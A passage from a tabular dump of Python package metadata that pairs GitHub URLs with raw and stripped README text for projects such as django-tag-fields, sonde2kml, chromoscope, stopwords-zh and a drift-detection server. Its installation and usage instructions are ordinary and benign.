**Parameters:**

*   `text`: Input text to convert to audio
*   `audio_file_path`: Output audio file path
*   `lang`: Language of the text (default: 'en')
*   `volume`: Volume level of the output audio (default: 1.0)
*   `sample_rate`: Audio sample rate (default: 44100 Hz)
*   `bit_depth`: Audio bit depth (default: 16)

Private Methods
---------------

These methods are used internally by the class and should not be called directly by the user.

### `_save_audio_to_file(self, audio, file_path)`

Save the audio data to a .wav file.

### `_process_audio_text(self, audio_text, **kwargs)`

Process the audio\_text and return the transcribed text.

### `_parse_recognition_response(self, response, show_all)`

Parse the response from the speech recognizer.

### `_process_recognized_audio(self, audio)`

Process the recognized audio and return the transcribed text.

### `_play_audio_file(self, audio_file_path, volume=1.0, normalize=False)`

Play the audio file with the specified volume and optional normalization.

### `_generate_frames(self, audio, sample_rate, frame_duration_ms)`

Generate audio frames from raw audio data.

### `_collect_voiced_segments(self, frames, vad, sample_rate, ratio=2)`

Collect voiced segments from audio frames using the Voice Activity Detection (VAD) algorithm.
","AudioProcessor
==============

`AudioProcessor` is a Python class that provides functionality for recording audio, transcribing audio to text, and converting text to audio.

Class Methods
-------------

### `__init__(self, frame_duration_ms=30, sample_rate=16000, chunk_size=1024, vad_mode=2)`

Initialize the `AudioProcessor` class.

**Parameters:**

*   `frame_duration_ms`: Frame duration in milliseconds (default: 30 ms)
*   `sample_rate`: Audio sample rate (default: 16000 Hz)
*   `chunk_size`: Audio chunk size for processing (default: 1024)
*   `vad_mode`: Voice Activity Detection (VAD) mode (default: 2)

### `record_audio(self, output_file_path)`

Record audio from the microphone and save it to a .wav file.

**Parameters:**

*   `output_file_path`: Output file path for the recorded audio

### `audio_to_text(self, audio_file_path, **kwargs)`

Transcribe an audio file.

**Parameters:**

*   `audio_file_path`: Input audio file path
*   `**kwargs`: Keyword arguments for preprocessing and other options

**Returns:**

*   Transcribed text as a string

### `text_to_audio(self, text, audio_file_path, lang='en', volume=1.0, sample_rate=44100, bit_depth=16)`

Convert text to an audio file and play it.

**Parameters:**

*   `text`: Input text to convert to audio
*   `audio_file_path`: Output audio file path
*   `lang`: Language of the text (default: 'en')
*   `volume`: Volume level of the output audio (default: 1.0)
*   `sample_rate`: Audio sample rate (default: 44100 Hz)
*   `bit_depth`: Audio bit depth (default: 16)

Private Methods
---------------

These methods are used internally by the class and should not be called directly by the user.

### `_save_audio_to_file(self, audio, file_path)`

Save the audio data to a .wav file.

### `_process_audio_text(self, audio_text, **kwargs)`

Process the audio\_text and return the transcribed text.

### `_parse_recognition_response(self, response, show_all)`

Parse the response from the speech recognizer.

### `_process_recognized_audio(self, audio)`

Process the recognized audio and return the transcribed text.

### `_play_audio_file(self, audio_file_path, volume=1.0, normalize=False)`

Play the audio file with the specified volume and optional normalization.

### `_generate_frames(self, audio, sample_rate, frame_duration_ms)`

Generate audio frames from raw audio data.

### `_collect_voiced_segments(self, frames, vad, sample_rate, ratio=2)`

Collect voiced segments from audio frames using the Voice Activity Detection (VAD) algorithm.
",thewordsmith123/audio-processor
django-tag-fields,https://github.com/imAsparky/django-tag-fields,1,2297,2043,"django-tag-fields
=================

.. image:: https://img.shields.io/pypi/pyversions/django-tag_fields.svg
   :target: https://pypi.org/project/django-tag-fields/
   :alt: Supported Python versions

.. image:: https://img.shields.io/pypi/djversions/django-taggit.svg
   :target: https://pypi.org/project/django-taggit/
   :alt: Supported Django versions

.. image:: https://github.com/imAsparky/django-tag-fields/workflows/Test/badge.svg
   :target: https://github.com/imAsparky/django-tag-fields/actions
   :alt: GitHub Actions

.. image:: https://codecov.io/gh/imAsparky/django-tag-fields/branch/main/graph/badge.svg?token=6TPEAAOUUF
   :target: https://codecov.io/gh/imAsparky/django-tag-fields

This is a clone of `Jazzband django-taggit <https://github.com/jazzband/django-taggit>`_ project.
By contributing you agree to abide by the `Contributor Code of Conduct
<https://github.com/imAsparky/django-tag-fields/blob/main/CODE_OF_CONDUCT.md>`_.


.. note::

   This project was cloned from ``django-taggit v3.1.0`` and will continue to work in the same
   way as that version.

   Over time I endeavor to extend django-taggit with individual field tagging.


``django-tag-fields`` a simpler approach to tagging with Django.  Add ``""tag_fields""`` to your
``INSTALLED_APPS`` then just add a TaggableManager to your model and go:

.. code:: python

    from django.db import models

    from tag_fields.managers import TaggableManager


    class Food(models.Model):
        # ... fields here

        tags = TaggableManager()


Then you can use the API like so:

.. code:: pycon

    >>> apple = Food.objects.create(name=""apple"")
    >>> apple.tags.add(""red"", ""green"", ""delicious"")
    >>> apple.tags.all()
    [<Tag: red>, <Tag: green>, <Tag: delicious>]
    >>> apple.tags.remove(""green"")
    >>> apple.tags.all()
    [<Tag: red>, <Tag: delicious>]
    >>> Food.objects.filter(tags__name__in=[""red""])
    [<Food: apple>, <Food: cherry>]

Tags will show up for you automatically in forms and the admin.

``django-tag-fields`` requires Django 3.2 or greater.

For more info check out the `documentation
<https://django-tag-fields.readthedocs.io/>`_.

For questions about usage or development you can create an issue on Github (if your question is about
usage please add the `question` label).
","django-tag-fields
=================

.. image:: https://img.shields.io/pypi/pyversions/django-tag_fields.svg
   :target: https://pypi.org/project/django-tag-fields/
   :alt: Supported Python versions

.. image:: https://img.shields.io/pypi/djversions/django-taggit.svg
   :target: https://pypi.org/project/django-taggit/
   :alt: Supported Django versions

.. image:: https://github.com/imAsparky/django-tag-fields/workflows/Test/badge.svg
   :target: https://github.com/imAsparky/django-tag-fields/actions
   :alt: GitHub Actions

.. image:: https://codecov.io/gh/imAsparky/django-tag-fields/branch/main/graph/badge.svg?token=6TPEAAOUUF
   :target: https://codecov.io/gh/imAsparky/django-tag-fields

This is a clone of `Jazzband django-taggit `_ project.
By contributing you agree to abide by the `Contributor Code of Conduct
`_.


.. note::

   This project was cloned from ``django-taggit v3.1.0`` and will continue to work in the same
   way as that version.

   Over time I endeavor to extend django-taggit with individual field tagging.


``django-tag-fields`` a simpler approach to tagging with Django.  Add ``""tag_fields""`` to your
``INSTALLED_APPS`` then just add a TaggableManager to your model and go:

.. code:: python

    from django.db import models

    from tag_fields.managers import TaggableManager


    class Food(models.Model):
        # ... fields here

        tags = TaggableManager()


Then you can use the API like so:

.. code:: pycon

    >>> apple = Food.objects.create(name=""apple"")
    >>> apple.tags.add(""red"", ""green"", ""delicious"")
    >>> apple.tags.all()
    [, , ]
    >>> apple.tags.remove(""green"")
    >>> apple.tags.all()
    [, ]
    >>> Food.objects.filter(tags__name__in=[""red""])
    [, ]

Tags will show up for you automatically in forms and the admin.

``django-tag-fields`` requires Django 3.2 or greater.

For more info check out the `documentation
`_.

For questions about usage or development you can create an issue on Github (if your question is about
usage please add the `question` label).
",imasparky/django-tag-fields
api-hunter-cli,https://github.com/engcarlosperezmolero/api_hunter_cli,4,0,0,,,engcarlosperezmolero/api_hunter_cli
locate-pixelcolor-cythonsingle,https://github.com/hansalemaos/locate_pixelcolor_cythonsingle,3,3430,3430,"# Compiled Cython Code - Detects colors in images 2-3 x faster than Numpy 

### pip install locate-pixelcolor-cythonsingle

#### Tested+compiled against Windows 10 / Python 3.10 / Anaconda

#### If you can't import it, compile it on your system (code at the end of this page)



### How to use it in Python 

```python
import numpy as np
import cv2
from locate_pixelcolor_cythonsingle import search_colors
# 4525 x 6623 x 3 picture https://www.pexels.com/pt-br/foto/foto-da-raposa-sentada-no-chao-2295744/
picx = r""C:\Users\hansc\Downloads\pexels-alex-andrews-2295744.jpg""
pic = cv2.imread(picx)
colors0 = np.array([[255, 255, 255]],dtype=np.uint8)
resus0 = search_colors(pic=pic, colors=colors0)
colors1=np.array([(66,  71,  69),(62,  67,  65),(144, 155, 153),(52,  57,  55),(127, 138, 136),(53,  58,  56),(51,  56,  54),(32,  27,  18),(24,  17,   8),],dtype=np.uint8)
resus1 =  search_colors(pic=pic, colors=colors1)
####################################################################
%timeit resus0 = search_colors(pic=pic, colors=colors0)
51 ms Â± 201 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)

b,g,r = pic[...,0],pic[...,1],pic[...,2]
%timeit np.where(((b==255)&(g==255)&(r==255)))
150 ms Â± 209 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)
####################################################################
%timeit resus1 =  search_colors(pic=pic, colors=colors1)
443 ms Â± 1.19 ms per loop (mean Â± std. dev. of 7 runs, 1 loop each)

%timeit np.where(((b==66)&(g==71)&(r==69))|((b==62)&(g==67)&(r==65))|((b==144)&(g==155)&(r==153))|((b==52)&(g==57)&(r==55))|((b==127)&(g==138)&(r==136))|((b==53)&(g==58)&(r==56))|((b==51)&(g==56)&(r==54))|((b==32)&(g==27)&(r==18))|((b==24)&(g==17)&(r==8)))
1 s Â± 16.1 ms per loop (mean Â± std. dev. of 7 runs, 1 loop each)
####################################################################
```


### The Cython Code 

```python
# cython: language_level=3

import numpy as np
cimport numpy as np

cpdef searchforcolor(np.uint8_t[::1] pic, np.uint8_t[::1] colors, int width, int totallengthpic, int totallengthcolor, int[::1] outputx, int[ ::1] outputy, int[::1] lastresult):
    cdef int counter = 0
    cdef unsigned char r, g, b
    cdef int i, j

    for i in range(0, totallengthcolor, 3):
        r = colors[i]
        g = colors[i + 1]
        b = colors[i + 2]
        for j in range(0, totallengthpic, 3):
            if ( r== pic[j]) and (g == pic[j+1]) and (b == pic[j+2]):
                dividend = j // 3
                quotient = dividend // width
                remainder = dividend % width
                outputx[counter] = quotient
                outputy[counter] = remainder
                lastresult[0] = counter
                counter += 1

# .\python.exe .\colorsearchcythonsinglesetup.py build_ext --inplace

```


### setup.py to compile the code 


```python
# cython: language_level=3

from setuptools import Extension, setup
from Cython.Build import cythonize
import numpy as np
ext_modules = [
    Extension(""colorsearchcythonsingle"", [""colorsearchcythonsingle.pyx""], include_dirs=[np.get_include()],define_macros=[(""NPY_NO_DEPRECATED_API"", ""NPY_1_7_API_VERSION"")])
]

setup(
    name='colorsearchcythonsingle',
    ext_modules=cythonize(ext_modules),
)


# .\python.exe .\colorsearchcythonsinglesetup.py build_ext --inplace
```
","# Compiled Cython Code - Detects colors in images 2-3 x faster than Numpy 

### pip install locate-pixelcolor-cythonsingle

#### Tested+compiled against Windows 10 / Python 3.10 / Anaconda

#### If you can't import it, compile it on your system (code at the end of this page)



### How to use it in Python 

```python
import numpy as np
import cv2
from locate_pixelcolor_cythonsingle import search_colors
# 4525 x 6623 x 3 picture https://www.pexels.com/pt-br/foto/foto-da-raposa-sentada-no-chao-2295744/
picx = r""C:\Users\hansc\Downloads\pexels-alex-andrews-2295744.jpg""
pic = cv2.imread(picx)
colors0 = np.array([[255, 255, 255]],dtype=np.uint8)
resus0 = search_colors(pic=pic, colors=colors0)
colors1=np.array([(66,  71,  69),(62,  67,  65),(144, 155, 153),(52,  57,  55),(127, 138, 136),(53,  58,  56),(51,  56,  54),(32,  27,  18),(24,  17,   8),],dtype=np.uint8)
resus1 =  search_colors(pic=pic, colors=colors1)
####################################################################
%timeit resus0 = search_colors(pic=pic, colors=colors0)
51 ms Â± 201 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)

b,g,r = pic[...,0],pic[...,1],pic[...,2]
%timeit np.where(((b==255)&(g==255)&(r==255)))
150 ms Â± 209 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)
####################################################################
%timeit resus1 =  search_colors(pic=pic, colors=colors1)
443 ms Â± 1.19 ms per loop (mean Â± std. dev. of 7 runs, 1 loop each)

%timeit np.where(((b==66)&(g==71)&(r==69))|((b==62)&(g==67)&(r==65))|((b==144)&(g==155)&(r==153))|((b==52)&(g==57)&(r==55))|((b==127)&(g==138)&(r==136))|((b==53)&(g==58)&(r==56))|((b==51)&(g==56)&(r==54))|((b==32)&(g==27)&(r==18))|((b==24)&(g==17)&(r==8)))
1 s Â± 16.1 ms per loop (mean Â± std. dev. of 7 runs, 1 loop each)
####################################################################
```


### The Cython Code 

```python
# cython: language_level=3

import numpy as np
cimport numpy as np

cpdef searchforcolor(np.uint8_t[::1] pic, np.uint8_t[::1] colors, int width, int totallengthpic, int totallengthcolor, int[::1] outputx, int[ ::1] outputy, int[::1] lastresult):
    cdef int counter = 0
    cdef unsigned char r, g, b
    cdef int i, j

    for i in range(0, totallengthcolor, 3):
        r = colors[i]
        g = colors[i + 1]
        b = colors[i + 2]
        for j in range(0, totallengthpic, 3):
            if ( r== pic[j]) and (g == pic[j+1]) and (b == pic[j+2]):
                dividend = j // 3
                quotient = dividend // width
                remainder = dividend % width
                outputx[counter] = quotient
                outputy[counter] = remainder
                lastresult[0] = counter
                counter += 1

# .\python.exe .\colorsearchcythonsinglesetup.py build_ext --inplace

```


### setup.py to compile the code 


```python
# cython: language_level=3

from setuptools import Extension, setup
from Cython.Build import cythonize
import numpy as np
ext_modules = [
    Extension(""colorsearchcythonsingle"", [""colorsearchcythonsingle.pyx""], include_dirs=[np.get_include()],define_macros=[(""NPY_NO_DEPRECATED_API"", ""NPY_1_7_API_VERSION"")])
]

setup(
    name='colorsearchcythonsingle',
    ext_modules=cythonize(ext_modules),
)


# .\python.exe .\colorsearchcythonsinglesetup.py build_ext --inplace
```
",hansalemaos/locate_pixelcolor_cythonsingle
matematicassimple,https://github.com/Aldogamer01/matematicassimple,0,1004,1004,"# Bienvenido a matematicassimple 

## Que es matematicassimple?

matematicassimple es una libreria de python especializado para programadores principiantes en el cual tiene funciones utiles para tu programa

## Por que usar matematicassimple?

matematicassimple ofrece la posibilidad de ayudarte con tu proyecto con sus funcionalidades, como por ejemplo: ordenar, raiz, elevado, factorial y muchas mas utilidades

## Como se instala?
Puedes ejecutar
```shell
pip install matematicassimple
```
o 
```
pip install git+https://github.com/aldogamer01/matematicassimple.git#egg=matematicassimple
```
## Como se usa?
Puedes ver los comandos disponibles y sus ejemplos en [la documentacion](./docs/index.md)
## Como contribuir con el proyecto
Puedes ver los pasos en [CONTRIBUTING.md](./docs/CONTRIBUTING)
## Licencia
Este proyecto estÃ¡ bajo la licencia MIT. Consulta el archivo [LICENSE](./LICENSE) para mÃ¡s detalles.
## Colaboradores
[Aldogamer01](https://github.com/aldogamer01)
","# Bienvenido a matematicassimple 

## Que es matematicassimple?

matematicassimple es una libreria de python especializado para programadores principiantes en el cual tiene funciones utiles para tu programa

## Por que usar matematicassimple?

matematicassimple ofrece la posibilidad de ayudarte con tu proyecto con sus funcionalidades, como por ejemplo: ordenar, raiz, elevado, factorial y muchas mas utilidades

## Como se instala?
Puedes ejecutar
```shell
pip install matematicassimple
```
o 
```
pip install git+https://github.com/aldogamer01/matematicassimple.git#egg=matematicassimple
```
## Como se usa?
Puedes ver los comandos disponibles y sus ejemplos en [la documentacion](./docs/index.md)
## Como contribuir con el proyecto
Puedes ver los pasos en [CONTRIBUTING.md](./docs/CONTRIBUTING)
## Licencia
Este proyecto estÃ¡ bajo la licencia MIT. Consulta el archivo [LICENSE](./LICENSE) para mÃ¡s detalles.
## Colaboradores
[Aldogamer01](https://github.com/aldogamer01)
",aldogamer01/matematicassimple
crossmark-jotform-api,https://github.com/mirkan1/crossmark-jotform-api,0,261,261,"# jotform api library for python
specilized for jotform api and crossmark needs

# updates
- 2023-04-26: added `set_new_submission` function, time to time it cannot find the submission, in that cases pulls the data directly from the api and sets as it is.
","# jotform api library for python
specilized for jotform api and crossmark needs

# updates
- 2023-04-26: added `set_new_submission` function, time to time it cannot find the submission, in that cases pulls the data directly from the api and sets as it is.
",mirkan1/crossmark-jotform-api
sonde2kml,https://github.com/0x9900/sonde2kml/,0,2205,2205,"
# Sonde2KML

Read the radiosonde log file and generate a `.kml` file for [Google Earth][1].

Works with logs coming from [radiosonde_auto_rx][2]

You can find more information on how to track weather balloons at [https://0x9900.com/][3]

## Usage
```
usage: sonde2kml.py [-h] (-d DIR | -f FILE) [-s SPACING] [-t TARGET_DIR] [-z]

Purge old dxcc images

options:
  -h, --help            show this help message and exit
  -d DIR, --dir DIR     Directory containing the log files
  -f FILE, --file FILE  Full path of the file to process
  -s SPACING, --spacing SPACING
                        Spacing between points [default: 100]
  -t TARGET_DIR, --target-dir TARGET_DIR
                        Directory for "".kml"" files [default: /tmp]
  -z, --zip             Compress the output file [default: False]
```

## Example

In the following example `sonde2kml` uses the last log file to generate the `.kml` file.

```
√ fred@sonderx$ sonde2kml --spacing 150 --file /tmp/sondes/20230117-112338_U2450614_RS41_404001_sonde.log
09:07:34 INFO: zip: False, spacing 150, target_dir: /tmp
09:07:34 INFO: Read file ""/tmp/sondes/20230117-112338_U2450614_RS41_404001_sonde.log"", number of points: 4473
09:07:34 INFO: Saving file /tmp/20230117-112338_U2450614_RS41_404001_sonde.kml
```

## Output

![Weahter Sonde path on Google Earth](misc/GoogleEarth-Sonde.png)

## Examples

  - [20230116-230717_U2450615_RS41_404000_sonde.kmz][4]
  - [20230117-112338_U2450614_RS41_404001_sonde.kmz][5]
  - [20230117-230557_U2450622_RS41_404001_sonde.kmz][6]
  - [20230118-110354_U2540033_RS41_404001_sonde.kmz][7]
  - [20230118-230610_U2540023_RS41_404001_sonde.kmz][8]
  - [20230119-110735_U2450623_RS41_404001_sonde.kmz][9]



[1]: https://www.google.com/earth/versions/#earth-pro
[2]: https://github.com/projecthorus/radiosonde_auto_rx
[3]: https://0x9900.com/tracking-weather-balloons/

[4]: misc/20230116-230717_U2450615_RS41_404000_sonde.kmz
[5]: misc/20230117-112338_U2450614_RS41_404001_sonde.kmz
[6]: misc/20230117-230557_U2450622_RS41_404001_sonde.kmz
[7]: misc/20230118-110354_U2540033_RS41_404001_sonde.kmz
[8]: misc/20230118-230610_U2540023_RS41_404001_sonde.kmz
[9]: misc/20230119-110735_U2450623_RS41_404001_sonde.kmz
","
# Sonde2KML

Read the radiosonde log file and generate a `.kml` file for [Google Earth][1].

Works with logs coming from [radiosonde_auto_rx][2]

You can find more information on how to track weather balloons at [https://0x9900.com/][3]

## Usage
```
usage: sonde2kml.py [-h] (-d DIR | -f FILE) [-s SPACING] [-t TARGET_DIR] [-z]

Purge old dxcc images

options:
  -h, --help            show this help message and exit
  -d DIR, --dir DIR     Directory containing the log files
  -f FILE, --file FILE  Full path of the file to process
  -s SPACING, --spacing SPACING
                        Spacing between points [default: 100]
  -t TARGET_DIR, --target-dir TARGET_DIR
                        Directory for "".kml"" files [default: /tmp]
  -z, --zip             Compress the output file [default: False]
```

## Example

In the following example `sonde2kml` uses the last log file to generate the `.kml` file.

```
√ fred@sonderx$ sonde2kml --spacing 150 --file /tmp/sondes/20230117-112338_U2450614_RS41_404001_sonde.log
09:07:34 INFO: zip: False, spacing 150, target_dir: /tmp
09:07:34 INFO: Read file ""/tmp/sondes/20230117-112338_U2450614_RS41_404001_sonde.log"", number of points: 4473
09:07:34 INFO: Saving file /tmp/20230117-112338_U2450614_RS41_404001_sonde.kml
```

## Output

![Weahter Sonde path on Google Earth](misc/GoogleEarth-Sonde.png)

## Examples

  - [20230116-230717_U2450615_RS41_404000_sonde.kmz][4]
  - [20230117-112338_U2450614_RS41_404001_sonde.kmz][5]
  - [20230117-230557_U2450622_RS41_404001_sonde.kmz][6]
  - [20230118-110354_U2540033_RS41_404001_sonde.kmz][7]
  - [20230118-230610_U2540023_RS41_404001_sonde.kmz][8]
  - [20230119-110735_U2450623_RS41_404001_sonde.kmz][9]



[1]: https://www.google.com/earth/versions/#earth-pro
[2]: https://github.com/projecthorus/radiosonde_auto_rx
[3]: https://0x9900.com/tracking-weather-balloons/

[4]: misc/20230116-230717_U2450615_RS41_404000_sonde.kmz
[5]: misc/20230117-112338_U2450614_RS41_404001_sonde.kmz
[6]: misc/20230117-230557_U2450622_RS41_404001_sonde.kmz
[7]: misc/20230118-110354_U2540033_RS41_404001_sonde.kmz
[8]: misc/20230118-230610_U2540023_RS41_404001_sonde.kmz
[9]: misc/20230119-110735_U2450623_RS41_404001_sonde.kmz
",0x9900/sonde2kml
chromoscope,https://github.com/hms-dbmi/chromoscope,2,1902,1902,"# chromoscope

[![PyPI - Version](https://img.shields.io/pypi/v/chromoscope.svg)](https://pypi.org/project/chromoscope)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/chromoscope.svg)](https://pypi.org/project/chromoscope)

-----

**Table of Contents**

- [Installation](#installation)
- [Development](#development)
- [License](#license)

## Installation

```console
pip install chromoscope
```

## Development

This project uses [`hatch`](https://github.com/pypa/hatch) for development, which can be installed via `pipx`.

To get started, `cd` into this directory and run:

```sh
hatch shell
```

This command will source a python virtual environment with all the necessary development dependencies,
as well as `chromoscope` installed in development mode. You can read more about environments
in the `hatch` [documentation](https://hatch.pypa.io/latest/environment/).

You can then launch Jupyter:

```sh
juptyer lab
```

and navigate to the `notebooks/playground.ipynb` to use the `Viewer`.

All development commands are run from the project root, from a terminal:

| Command                | Action                                                              |
| :--------------------- | :------------------------------------------------------------------ |
| `hatch run test`       | Run unit tests with `pytest` in latest Python version.              |
| `hatch run test:test`  | Run unit tests with `pytest` in all target Python versions.         |
| `hatch version`        | Version the python package. Read more in the [docs](https://hatch.pypa.io/latest/version)|
| `hatch build`          | Build the sdist and wheels for PyPI. Generates `dist/`              |
| `hatch publish`        | Publish the package to PyPI. Requires API keys.                     |

## License

`chromoscope` is distributed under the terms of the [MIT](https://spdx.org/licenses/MIT.html) license.
","# chromoscope

[![PyPI - Version](https://img.shields.io/pypi/v/chromoscope.svg)](https://pypi.org/project/chromoscope)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/chromoscope.svg)](https://pypi.org/project/chromoscope)

-----

**Table of Contents**

- [Installation](#installation)
- [Development](#development)
- [License](#license)

## Installation

```console
pip install chromoscope
```

## Development

This project uses [`hatch`](https://github.com/pypa/hatch) for development, which can be installed via `pipx`.

To get started, `cd` into this directory and run:

```sh
hatch shell
```

This command will source a python virtual environment with all the necessary development dependencies,
as well as `chromoscope` installed in development mode. You can read more about environments
in the `hatch` [documentation](https://hatch.pypa.io/latest/environment/).

You can then launch Jupyter:

```sh
juptyer lab
```

and navigate to the `notebooks/playground.ipynb` to use the `Viewer`.

All development commands are run from the project root, from a terminal:

| Command                | Action                                                              |
| :--------------------- | :------------------------------------------------------------------ |
| `hatch run test`       | Run unit tests with `pytest` in latest Python version.              |
| `hatch run test:test`  | Run unit tests with `pytest` in all target Python versions.         |
| `hatch version`        | Version the python package. Read more in the [docs](https://hatch.pypa.io/latest/version)|
| `hatch build`          | Build the sdist and wheels for PyPI. Generates `dist/`              |
| `hatch publish`        | Publish the package to PyPI. Requires API keys.                     |

## License

`chromoscope` is distributed under the terms of the [MIT](https://spdx.org/licenses/MIT.html) license.
",hms-dbmi/chromoscope
cashman,https://github.com/LordUbuntu/cash-man,4,403,403,"# Cash Man

Cashman is a personal expenses tracker for fun and profit.

## Info

Cashman uses rich and click to provide a straight-forward eye-candy cli experience for users. Expenses are tracked using CSV files to ensure maximum portability and interoperability for any personal financial workflow.

For usage info, run `cashman --help`

## Notes

May switch to Poetry for packaging in the future...


","# Cash Man

Cashman is a personal expenses tracker for fun and profit.

## Info

Cashman uses rich and click to provide a straight-forward eye-candy cli experience for users. Expenses are tracked using CSV files to ensure maximum portability and interoperability for any personal financial workflow.

For usage info, run `cashman --help`

## Notes

May switch to Poetry for packaging in the future...


",lordubuntu/cash-man
parsel-get-selector-text,https://github.com/carlosplanchon/parsel_get_selector_text,0,85,85,"# parsel_get_selector_text
Module to get_selector_text from parsel.Selector objects.
","# parsel_get_selector_text
Module to get_selector_text from parsel.Selector objects.
",carlosplanchon/parsel_get_selector_text
stopwords-zh,https://github.com/yuanjie-ai/stopwords-zh,0,806,780,"

![image](https://img.shields.io/pypi/v/stopwords-zh.svg) ![image](https://img.shields.io/travis/yuanjie-ai/stopwords-zh.svg) ![image](https://readthedocs.org/projects/stopwords-zh/badge/?version=latest)



<h1 align = ""center"">🔥stopwords-zh🔥</h1>

---
### 欢迎提交更新，共建中文停用词库

# Install
```shell
pip install -U stopwords-zh
```

# [Docs](https://yuanjie-ai.github.io/stopwords-zh/)

# Usages
- source: string, 停用词来源，目前支持
  - baidu: 百度停用词表
  - hit: 哈工大停用词表
  - ict: 中科院计算所停用词表
  - scu: 四川大学机器智能实验室停用词库
  - cn: 广为流传未知来源的中文停用词表
  - marimo: Marimo multi-lingual stopwords collection 内的中文停用词
  - iso: Stopwords ISO 内的中文停用词
  - all: 上述所有停用词并集
```python
import jieba
from stopwords import stopwords, filter_stopwords

print(filter_stopwords(jieba.cut('欢迎提交更新，共建中文停用词库')))

```

---
# TODO

- [x] 停用词
- [ ] 情感字典




","

![image](https://img.shields.io/pypi/v/stopwords-zh.svg) ![image](https://img.shields.io/travis/yuanjie-ai/stopwords-zh.svg) ![image](https://readthedocs.org/projects/stopwords-zh/badge/?version=latest)



🔥stopwords-zh🔥

---
### 欢迎提交更新，共建中文停用词库

# Install
```shell
pip install -U stopwords-zh
```

# [Docs](https://yuanjie-ai.github.io/stopwords-zh/)

# Usages
- source: string, 停用词来源，目前支持
  - baidu: 百度停用词表
  - hit: 哈工大停用词表
  - ict: 中科院计算所停用词表
  - scu: 四川大学机器智能实验室停用词库
  - cn: 广为流传未知来源的中文停用词表
  - marimo: Marimo multi-lingual stopwords collection 内的中文停用词
  - iso: Stopwords ISO 内的中文停用词
  - all: 上述所有停用词并集
```python
import jieba
from stopwords import stopwords, filter_stopwords

print(filter_stopwords(jieba.cut('欢迎提交更新，共建中文停用词库')))

```

---
# TODO

- [x] 停用词
- [ ] 情感字典




",yuanjie-ai/stopwords-zh
local-real-estate-python-backend,https://github.com/javatechy/dokr,0,89,89,"This is a package for sharing common Real-Estate function used in different repositories
","This is a package for sharing common Real-Estate function used in different repositories
",javatechy/dokr
bm-utilities,https://github.com/Youssefamroo/bm_utilities,0,610,610,"# bm_utilities


[![image](https://img.shields.io/pypi/v/bm_utilities.svg)](https://pypi.python.org/pypi/bm_utilities)
[![image](https://img.shields.io/conda/vn/conda-forge/bm_utilities.svg)](https://anaconda.org/conda-forge/bm_utilities)


**A Python package for bm utilities**


-   Free software: MIT license
-   Documentation: https://Youssefamroo.github.io/bm_utilities
    

## Features

-   TODO

## Credits

This package was created with [Cookiecutter](https://github.com/cookiecutter/cookiecutter) and the [giswqs/pypackage](https://github.com/giswqs/pypackage) project template.
","# bm_utilities


[![image](https://img.shields.io/pypi/v/bm_utilities.svg)](https://pypi.python.org/pypi/bm_utilities)
[![image](https://img.shields.io/conda/vn/conda-forge/bm_utilities.svg)](https://anaconda.org/conda-forge/bm_utilities)


**A Python package for bm utilities**


-   Free software: MIT license
-   Documentation: https://Youssefamroo.github.io/bm_utilities
    

## Features

-   TODO

## Credits

This package was created with [Cookiecutter](https://github.com/cookiecutter/cookiecutter) and the [giswqs/pypackage](https://github.com/giswqs/pypackage) project template.
",youssefamroo/bm_utilities
drifting,https://github.com/sign-ai/drifting/,3,2414,2414,"# Drifting

[![CI/CD](https://github.com/smolendawid/cacha/actions/workflows/cicd.yaml/badge.svg)](https://github.com/sign-ai/drifting/actions/workflows/precommit.yaml)
[![PyPi](https://img.shields.io/pypi/v/cacha?label=PyPI&logo=pypi)](https://pypi.org/project/cacha/)
[![License](https://img.shields.io/pypi/l/cacha.svg)](https://github.com/sign-ai/drifting/blob/main/LICENSE)

The most flexible Drift Detection Server.

Learn about the concepts in
[Docs](https://sign-ai.github.io/drifting/)

---

Main features:

:+1: surprisingly easy to use

:+1: production-ready server

:+1: created with real use-cases in mind

:+1: not just a math library

:+1: Python-first, API-first

## Quickstart

`drifting` is built with Developer Experience in mind.

You communicate with Drift Detection Server via `DriftingClient` or API,
both for fitting the Drift Detector and detecting the drift. In your training
pipeline, use the `fit` method:

```python
import drifting
drifting.fit(train_column, project=""example"")

```

Then, next to your prediction call:

```python
import drifting
response = drifting.detect(inference_data, project=""example"")
response.is_drift
```

Note that this makes the usage of the server **as easy as possible**.

1. It's not required to manage any artifacts,
1. No need to implement any feedback loops,
1. No need to collect test data,
1. No need to leave your python environment, fetch any logs,
1. You only make request to the server twice.

## Local installation and running

To install dependencies, use poetry:

```
poetry install
```

And run server locally:

```
python drifting/app.py
```

## Production usage

To use Drift Detection Server in your organization,
build and deploy the Docker image, or use the pre-built version from _TODO_.

### Docker on a custom server

To deploy the on cloud instance using docker, you can easily pull the image
and run it:

```python
TODO
```

### Kubernetes and Helm

For more demanding use-cases, it's facilitated to deploy Drift Detection Server
on kubernetes. DDS is packaged with bitnami. You can include the chart by

```python
TODO
```

## Real-world scenarios

Even though Drift Detection Server makes the task incredibly easy,
it still follows the MLOps culture, assuring reproducibility,
observability and scalability postulates are fulfilled.

Please read the [Docs](https://sign-ai.github.io/drifting/)
to learn about real-world usage.


","# Drifting

[![CI/CD](https://github.com/smolendawid/cacha/actions/workflows/cicd.yaml/badge.svg)](https://github.com/sign-ai/drifting/actions/workflows/precommit.yaml)
[![PyPi](https://img.shields.io/pypi/v/cacha?label=PyPI&logo=pypi)](https://pypi.org/project/cacha/)
[![License](https://img.shields.io/pypi/l/cacha.svg)](https://github.com/sign-ai/drifting/blob/main/LICENSE)

The most flexible Drift Detection Server.

Learn about the concepts in
[Docs](https://sign-ai.github.io/drifting/)

---

Main features:

:+1: surprisingly easy to use

:+1: production-ready server

:+1: created with real use-cases in mind

:+1: not just a math library

:+1: Python-first, API-first

## Quickstart

`drifting` is built with Developer Experience in mind.

You communicate with Drift Detection Server via `DriftingClient` or API,
both for fitting the Drift Detector and detecting the drift. In your training
pipeline, use the `fit` method:

```python
import drifting
drifting.fit(train_column, project=""example"")

```

Then, next to your prediction call:

```python
import drifting
response = drifting.detect(inference_data, project=""example"")
response.is_drift
```

Note that this makes the usage of the server **as easy as possible**.

1. It's not required to manage any artifacts,
1. No need to implement any feedback loops,
1. No need to collect test data,
1. No need to leave your python environment, fetch any logs,
1. You only make request to the server twice.

## Local installation and running

To install dependencies, use poetry:

```
poetry install
```

And run server locally:

```
